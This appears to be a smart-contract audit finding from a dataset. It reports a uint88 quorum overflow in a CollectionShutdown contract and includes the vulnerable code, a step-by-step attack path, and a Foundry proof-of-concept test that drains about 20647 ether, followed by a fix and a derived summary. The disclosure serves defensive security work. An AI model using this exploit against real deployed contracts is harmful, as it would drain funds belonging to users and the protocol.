---
id: 23232
severity: "High"
---

# Quorum overflow in CollectionShutdown

## Description

CollectionShutdown.sol#150 and CollectionShutdown.sol#L247 cast quorum votes to uint88 as follows:
```solidity
uint totalSupply = params.collectionToken.totalSupply();
if (totalSupply > MAX_SHUTDOWN_TOKENS * 10 ** params.collectionToken.denomination()) revert TooManyItems();
// Set our quorum vote requirement
params.quorumVotes = uint88(totalSupply * SHUTDOWN_QUORUM_PERCENT / ONE_HUNDRED_PERCENT);
```
The problem with the above is that it may overflow:
• collectionToken.denomination() may max 9
• MAX_SHUTDOWN_TOKENS==4
• SHUTDOWN_QUORUM_PERCENT/ONE_HUNDRED_PERCENT==1/2
• Collection tokens are minted in Locker as follows:
– token.mint(_recipient,tokenIdsLength*1ether*10**token.denomination());
E.g. with totalSupply==0.6190ether*10**9, we have that the check still passes, but:
• totalSupply*SHUTDOWN_QUORUM_PERCENT/ONE_HUNDRED_PERCENT=0.3095ether*10**9
• type(uint88).max =0.309485ether*10**9
• uint88(0.3095ether*10**9) =0.000015ether*10**9
Upon collection shutdown, tokens are sold on Sudoswap, and the funds thus obtained are distributed among the claimants. The claimed amount is then divided by quorumVotes as follows:
```solidity
uint amount = params.availableClaim * claimableVotes / (params.quorumVotes * ONE_HUNDRED_PERCENT / SHUTDOWN_QUORUM_PERCENT);
```
Thus, when dividing by a much smaller quorumVotes, the claimant receives much more than they are eligible for: in the PoC it's 20647ether though only 1ether has been received from sales.
CollectionShutdown.sol#150 and CollectionShutdown.sol#L247 downcast the quorum votes to uint88, which may overflow.
Internal pre-conditions
1. The collection token denomination needs to be sufficiently large to cause overflow
2. The amount of shutdown votes needs to be sufficiently large to cause overflow.
External pre-conditions
none
Attack Path
1. A user creates a collection with denomination 9
2. The user holding 0.6190ether*10**9 of the collection token (i.e. less than 1 NFT) starts collection shutdown.
• At that point the quorum of votes overflows, and becomes much smaller
3. Collection shutdown is executed normally.
4. Tokens are sold on Sudoswap.
• In the PoC they are sold for 1ether.
5. User claims the balance. Due to the overflow, they receive much more than what their NFTs were worth.
• In the PoC user receives 20647ether though only 1ether has been received from sales.
The protocol suffers unbounded losses (the whole balance of CollectionShutdown contract can be drained.

## Proof of Concept

Drop this test to CollectionShutdown.t.sol and execute with forge test --match-test test_QuorumOverflow:
```solidity
function test_QuorumOverflow() public {
    locker.createCollection(address(erc721c), 'Test Collection', 'TEST', 9);
    // Initialize our collection, without inflating `totalSupply` of the {CollectionToken}
    locker.setInitialized(address(erc721c), true);
    // Set our collection token for ease for reference in tests
    collectionToken = locker.collectionToken(address(erc721c));
    // Approve our shutdown contract to use test suite's tokens
    collectionToken.approve(address(collectionShutdown), type(uint).max);
    // Give some initial balance to CollectionShutdown contract
    vm.deal(address(collectionShutdown), 30000 ether);
    vm.startPrank(address(locker));
    // Suppose address(1) holds 0.6190 ether
    // in a collection token with denomination 9
    collectionToken.mint(address(1), 0.6190 ether * 10**9);
    vm.stopPrank();
    // Start collection shutdown from address(1)
    vm.startPrank(address(1));
    collectionToken.approve(address(collectionShutdown), 0.6190 ether * 10**9);
    collectionShutdown.start(address(erc721c));
    vm.stopPrank();
    // Mint NFTs into our collection {Locker} and process the execution
    uint[] memory tokenIds = _mintTokensIntoCollection(erc721c, 3);
    collectionShutdown.execute(address(erc721c), tokenIds);
    // Mock the process of the Sudoswap pool liquidating the NFTs for ETH.
    vm.startPrank(SUDOSWAP_POOL);
    // Transfer the specified tokens away from the Sudoswap position to simulate a purchase
    for (uint i; i < tokenIds.length; ++i) {
        erc721c.transferFrom(SUDOSWAP_POOL, address(5), i);
    }
    // Ensure the sudoswap pool has enough ETH to send
    deal(SUDOSWAP_POOL, 1 ether);
    // Send ETH from the Sudoswap Pool into the {CollectionShutdown} contract
    (bool sent,) = payable(address(collectionShutdown)).call{value: 1 ether}('');
    require(sent, 'Failed to send {CollectionShutdown} contract');
    vm.stopPrank();
    // Get our start balances so that we can compare to closing balances from claim
    uint startBalanceAddress = payable(address(1)).balance;
    // address(1) now can claim
    collectionShutdown.claim(address(erc721c), payable(address(1)));
    // Due to quorum overflow, address(1) now holds ~ 20647 ether
    assertApproxEqRel(payable(address(1)).balance - startBalanceAddress, 20647 ether, 0.01 ether);
}
```

## Recommendation

Employ the appropriate type and cast for quorumVotes, e.g. uint92.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an integer overflow that occurs when the contract calculates the required quorum of votes for a collection shutdown and stores the result in a uint88 variable. The calculation multiplies the total supply of collection tokens by a fixed percentage (50 %) and then casts the product to uint88. Because collection tokens use a denomination that can be as high as 10⁹, the intermediate product can exceed the maximum value representable by uint88 (≈3.09×10⁸). When this happens the cast silently truncates the high bits, producing a much smaller quorum value than intended. During the claim phase the contract divides the available claim amount by this truncated quorum value, which inflates the payout dramatically. An attacker who creates a collection with a high denomination, holds a relatively small amount of tokens (for example 0.6190 ether × 10⁹ units, i.e. less than one NFT), and then initiates a shutdown will trigger the overflow. The shutdown proceeds normally, the NFTs are sold for a modest amount of ETH (e.g. 1 ether), but the claimant receives an amount on the order of 20 000 ether because the denominator in the payout formula is far too small. From the user’s point of view the expectation is to receive a proportional share of the sale proceeds, yet the balance of the claimant’s address jumps to an unexpectedly huge value, while the contract balance is drained. The issue was discovered during a manual audit that included a proof‑of‑concept test written in Solidity; the test showed the overflow and the resulting over‑payment. The bug is hard to notice because the overflow does not revert – the cast simply drops the excess bits, so the contract logic appears to run correctly and the abnormal payout only becomes evident when a claim is made. The root cause is the unsafe down‑casting of a value that can exceed the target type’s range. The flaw belongs to the class of arithmetic overflow/underflow bugs caused by inappropriate type sizing. To remediate the problem the quorumVotes variable should be stored in a type large enough to hold the maximum possible product (for example uint92) or the calculation should be performed with checked arithmetic and only cast after confirming the value fits. Using a larger integer type or adding explicit overflow checks will prevent the quorum from being reduced unintentionally and will ensure that claim payouts remain bounded by the actual funds received from the NFT sale.
